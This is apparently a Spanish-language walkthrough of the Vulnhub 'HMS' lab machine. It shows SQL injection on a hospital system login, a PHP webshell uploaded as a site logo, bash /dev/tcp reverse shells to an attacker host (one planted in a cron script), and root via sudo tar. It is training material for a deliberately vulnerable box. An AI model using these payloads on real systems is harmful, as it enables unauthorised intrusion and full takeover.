---
title: Vulnhub - HMS
author: cotes
date: 2023-10-11 17:51:00 +0800
categories: [Writeup, Vulnhub, Easy]
tags: [Linux, 'SQL Injection', 'File Upload', 'Crontab Abusing']
math: true
mermaid: true
image:
  path: /assets/images/Vulnhub/Easy/HMS/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: HMS Machine Logo
---

Máquina Linux de nivel **Easy** de Vulnhub.

Técnicas usadas: **SQL Injection, File Upload, Crontab Abusing**


### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos.

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

  ![](/assets/images/Vulnhub/Easy/HMS/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos

* **`nmap -p22,80 -sCV <IP> -oN versiones`**

  ![](/assets/images/Vulnhub/Easy/HMS/02-versions.png)

c. Tenemos un panel de login de **Hospital Management System**, como no tenemos credenciales, probaremos una inyección SQL

![](/assets/images/Vulnhub/Easy/HMS/03-sql.png)

> Para que no tengamos problemas en la inyección sql, cambiamos el tipo de input de `email` **->** `text` 💉
{: .prompt-info }

d. Una vez nos autentiquemos, inspeccionamos el código fuente de la página web

![](/assets/images/Vulnhub/Easy/HMS/04-leak.png)

* Si nos dirigimos a **/setting.php** veremos que podemos cambiar la configuración del sitio web, entre ellas, el logo del sitio. Aquí subiremos una webshell en php

  * test.php

    ```php
    <?php system($_GET["cmd"]); ?>
    ```

* Para saber donde se almacena este fichero, analizamos el código fuente de la página

  ![](/assets/images/Vulnhub/Easy/HMS/05-leak.png)

* Ahora nos entablaremos una **reverse shell**: `/uploadImage/Logo/test.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/<IP Host>/<Port>%200%3E%261%22`

  ```bash
  ❯ nc -lvnp 443
  listening on [any] 443 ...
  connect to [192.168.100.70] from (UNKNOWN) [192.168.100.41] 47400
  bash: cannot set terminal process group (1379): Inappropriate ioctl for device
  bash: no job control in this shell
  bash-4.3$
  ```

### Escalada de Privilegios 💹

a. Primero, convertimos la shell en una TTY (Totalmente interactiva)

```bash
bash-4.3$ script /dev/null -c bash
bash-4.3$ ^Z
zsh: suspended  nc -lvnp 443
❯ stty raw -echo;fg
[1]  + continued  nc -lvnp 443
              reset xterm
  [ENTER]

bash-4.3$ export TERM=xterm-256color
bash-4.3$ source /etc/skel/.bashrc 
daemon@nivek:/opt/lampp/htdocs/uploadImage/Logo$
```

b. Buscamos por binarios con permisos SUID

```bash
daemon@nivek:/opt/lampp/htdocs/uploadImage/Logo$ find / -perm -4000 2>/dev/null
<SNIP>
/usr/bin/bash

daemon@nivek:/opt/lampp/htdocs/uploadImage/Logo$ ls -la /usr/bin/bash
-rwsr-xr-x 1 eren eren 1037464 Jul 26  2021 /usr/bin/bash
```

c. Nos transformamos en `eren` y vemos las tareas cron que se ejecutan en el sistema

```bash
bash-4.3$ cat /etc/crontab 
<SNIP>
*/5 * * * * eren /home/eren/backup.sh
```

> La tarea se ejecuta cada **5 minutos**. Podemos alterar el fichero '/home/eren/backup.sh' para enviarnos un reverse shell
{: .prompt-info }



d. Si spawneamos una shell como `eren` veremos que no somos capaces de listar privilegios a nivel de sudoers. Por esta razón, entablamos un reverse shell, a fin de transformarla en una TTY (Totalmente Interactiva).

```bash
bash-4.3$ cat /home/eren/backup.sh
#!/bin/bash
bash -i >& /dev/tcp/<IP Host>/4444 0>&1
<SNIP>
------------------------------------------------
❯ nc -lvnp 4444
eren@nivek:~$ script /dev/null -c bash
eren@nivek:~$ ^Z
zsh: suspended  nc -lvnp 4444
❯ stty raw -echo;fg
[1]  + continued  nc -lvnp 4444
              reset xterm
  [ENTER]

eren@nivek:~$ export TERM=xterm-256color
eren@nivek:~$ source /etc/skel/.bashrc 
```

* Listamos nuestros permisos a nivel de sudoers

  ```bash
  eren@nivek:~$ sudo -l
  User eren may run the following commands on nivek:
    (root) NOPASSWD: /bin/tar
  ```

e. Vemos en [**GTFObins**](https://gtfobins.github.io/gtfobins/tar/#sudo) una forma de spawnear una reverse shell

```bash
eren@nivek:~$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami
root
```